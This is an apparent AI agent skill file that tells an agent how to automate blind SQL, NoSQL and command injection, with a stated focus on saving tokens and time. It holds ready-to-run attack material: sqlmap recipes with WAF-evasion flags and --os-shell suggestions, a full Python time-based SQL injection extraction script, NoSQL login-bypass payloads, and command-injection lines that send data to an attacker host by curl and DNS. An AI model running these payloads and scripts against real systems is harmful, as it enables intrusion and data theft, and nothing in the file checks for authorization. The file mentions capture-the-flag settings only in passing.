---
name: blind-injection-automation
description: Automated tool-assisted strategies for blind injection attacks (SQL, NoSQL, command, XPath). Covers when and how to use sqlmap, custom scripting, and binary search optimization to minimize token consumption and execution time. Use when manual blind injection would require >20 sequential requests.
metadata:
  hermes:
    category: web-security
    tags: [blind-injection, sqlmap, automation, token-efficiency, time-based, boolean-based]
platforms: [linux, macos, windows]
---

# Blind Injection Automation Skill

## When to Use

Activate this skill when:
- You have confirmed a blind injection point (time-based or boolean-based)
- Manual extraction would require >20 sequential character-by-character requests
- Time-based blind SQLi is detected (`SLEEP(5)` / `pg_sleep(5)` / `dbms_pipe.receive_message`)
- Boolean-based blind SQLi is confirmed (`AND 1=1` vs `AND 1=2` produces different responses)
- You need to extract database names, table names, column names, or row data

**Critical Rule**: Manual blind injection burns enormous token budgets. Always prefer automation.

---

## The Cost Problem

| Method | Requests per char | Typical charset | Total requests | Est. time | Est. tokens |
|--------|------------------|-----------------|----------------|-----------|-------------|
| Manual ASCII brute-force | 1 | 32–126 (95 chars) | 95 × length | Very long | Very high |
| Manual binary search | log₂(95) ≈ 7 | 32–126 | 7 × length | Long | High |
| **sqlmap (--dump)** | Optimized | Auto-detected | **Minimal** | **Fastest** | **Lowest** |
| **Custom Python script** | 1 (batched) | Configurable | Low | Fast | Low |

**Data from benchmarks**: Blind injection tasks average **46 minutes / 7.9M tokens** when done manually. Automation reduces this to **<5 minutes / <500K tokens**.

---

## Decision Tree: Manual vs Automation

```
Blind injection confirmed
        |
        v
    Can you use sqlmap?
        |--YES--> Use sqlmap with optimized flags (see below)
        |
        NO (e.g., custom protocol, complex auth, WAF blocks sqlmap)
        |
        v
    Can you write a Python script?
        |--YES--> Write async Python script with binary search (see template below)
        |
        NO (e.g., no Python env, extreme constraints)
        |
        v
    Fallback: Manual binary search, but STRICTLY limit scope
               - Max 20 characters total
               - Abort if >5 minutes with no result
```

---

## sqlmap: Primary Automation Tool

### Installation & Setup
```bash
# sqlmap is usually pre-installed in CTF environments
which sqlmap || pip install sqlmap

# Verify installation
sqlmap --version
```

### Optimized Command Reference

**Basic blind detection and DB fingerprinting:**
```bash
sqlmap -u "http://target/page.php?id=1" \
  --level=2 --risk=1 \
  --batch --threads=10 \
  --technique=T  # Time-based only
```

**Boolean-based extraction (faster than time-based):**
```bash
sqlmap -u "http://target/page.php?id=1" \
  --level=2 --risk=1 \
  --batch --threads=10 \
  --technique=B  # Boolean-based only
```

**Dump specific table (most token-efficient):**
```bash
sqlmap -u "http://target/page.php?id=1" \
  -D database_name -T table_name --dump \
  --batch --threads=10 \
  --technique=BT  # Boolean + Time
```

**Avoid token waste — use these flags:**
| Flag | Purpose | Saves tokens by... |
|------|---------|-------------------|
| `--batch` | Never ask interactive questions | Preventing prompt loops |
| `--threads=10` | Parallel requests | Reducing wall-clock time |
| `--technique=BT` | Limit to blind techniques | Skipping UNION/error tests |
| `--level=2 --risk=1` | Minimal probe set | Avoiding 100+ WAF triggers |
| `--dbms=mysql` | Skip DBMS fingerprinting | ~10 fewer probes |
| `--dump --start=1 --stop=10` | Limit rows | Preventing full-table dumps |
| `--search -C flag` | Search for column name | Targeted extraction |
| `--time-sec=2` | Reduce sleep time | 2.5× faster than default 5s |
| `--timeout=10` | Fail fast on slow responses | Avoiding hung connections |

### sqlmap + Authentication
```bash
sqlmap -u "http://target/api/data" \
  --cookie="session=abc123" \
  --header="Authorization: Bearer token" \
  --data='{"id":1}'  # For POST/JSON injection points
```

### sqlmap Abort Conditions
- If sqlmap runs >10 minutes with no DBMS identified → **abort and pivot**
- If WAF blocks sqlmap with rate limiting → reduce `--threads=1`, add `--delay=1`
- If `--dump` returns empty → the injection point may not have SELECT privileges; try `--sql-shell` or `--os-shell`

---

## Custom Python Script Template

When sqlmap is blocked or the injection vector is non-standard, use this async binary-search template:

```python
import asyncio, aiohttp, time

TARGET = "http://target/vulnerable"
PAYLOAD_TEMPLATE = "1' AND IF(ASCII(SUBSTRING(({query}),{pos},1))>{mid},SLEEP(0.5),0)-- -"

async def binary_search_char(session, query, pos, low=32, high=126):
    """Extract a single character using binary search."""
    while low <= high:
        mid = (low + high) // 2
        payload = PAYLOAD_TEMPLATE.format(query=query, pos=pos, mid=mid)
        start = time.time()
        async with session.get(TARGET, params={"id": payload}) as resp:
            await resp.text()
        elapsed = time.time() - start
        
        if elapsed > 0.4:  # SLEEP(0.5) triggered
            low = mid + 1
        else:
            high = mid - 1
    
    return chr(low)

async def extract_string(session, query, max_len=50):
    """Extract up to max_len characters."""
    result = ""
    for pos in range(1, max_len + 1):
        char = await binary_search_char(session, query, pos)
        result += char
        if char == '\x00':  # String terminator
            break
    return result.strip('\x00')

async def main():
    async with aiohttp.ClientSession() as session:
        # Example: extract database name
        db_name = await extract_string(session, "SELECT database()")
        print(f"Database: {db_name}")

asyncio.run(main())
```

**Optimization notes:**
- Use `aiohttp` with `limit=50` connection pool for parallelism
- For **boolean-based**, replace timing check with response-length/content comparison
- Pre-compute string length with `LENGTH(({query}))` to avoid unnecessary iterations

---

## NoSQL Blind Injection

MongoDB boolean-based blind:
```json
{"username":{"$ne":null}, "password":{"$ne":null}}
```

Extract data character-by-character:
```json
{"username":{"$regex":"^a.*"}, "password":{"$ne":null}}
```

Tool: `nosqlmap` (if available) or custom Python with `pymongo`/`requests`.

---

## Command Injection Blind (Time-Based)

When output is not returned but command executes:
```bash
# Time-based confirmation
; sleep 5
| sleep 5
`sleep 5`
$(sleep 5)

# Exfiltrate data via DNS / time
; curl $(whoami).attacker.com
; ping -c 1 $(cat /flag.txt).attacker.com  # DNS exfil
```

For CTFs with no outbound DNS, use **file-based side channels** or **time-based binary encoding**:
```bash
; if [ $(cat /flag.txt | cut -c1) = "f" ]; then sleep 5; fi
```

---

## Token Budget Rules for Blind Injection

1. **NEVER do manual character-by-character extraction** for strings longer than 10 characters.
2. **If sqlmap is available, use it immediately** after confirming the injection point. Do not waste tokens on manual reconnaissance.
3. **Set a hard limit**: If automated extraction exceeds 10 minutes or 1M tokens, **abort and report** the injection point with a recommendation for manual exploitation.
4. **Parallelize aggressively**: Use `--threads=10` (sqlmap) or async Python. Sequential requests are the #1 token waster.
5. **Scope extraction tightly**: Only extract what you need (e.g., `SELECT flag FROM flags LIMIT 1`), not the entire schema.

---

## Pitfalls

- **sqlmap WAF evasion**: sqlmap's default user-agent is fingerprinted. Add `--user-agent="Mozilla/5.0"` or `--random-agent`.
- **False positives from network jitter**: Time-based blind requires stable network. If jitter > 1s, switch to boolean-based or increase `--time-sec`.
- **Over-extraction**: Dumping entire databases burns tokens. Use `-D db -T table -C column` for targeted extraction.
- **Ignoring second-order injection**: Some blind SQLi triggers only after a page reload or secondary request. Use `--second-order` in sqlmap.
- **Stacked queries blocked**: If `; DROP` fails, stacked queries are blocked. This does NOT mean SQLi is unexploitable — UNION or blind techniques still work.

## Verification Checklist

- [ ] Confirmed injection type (boolean-based or time-based)
- [ ] Attempted sqlmap with optimized flags first
- [ ] If sqlmap failed, attempted custom Python automation
- [ ] Set token/time budget before starting extraction
- [ ] Extracted only necessary data (not full schema)
- [ ] Documented DBMS type, injection point, and payload type
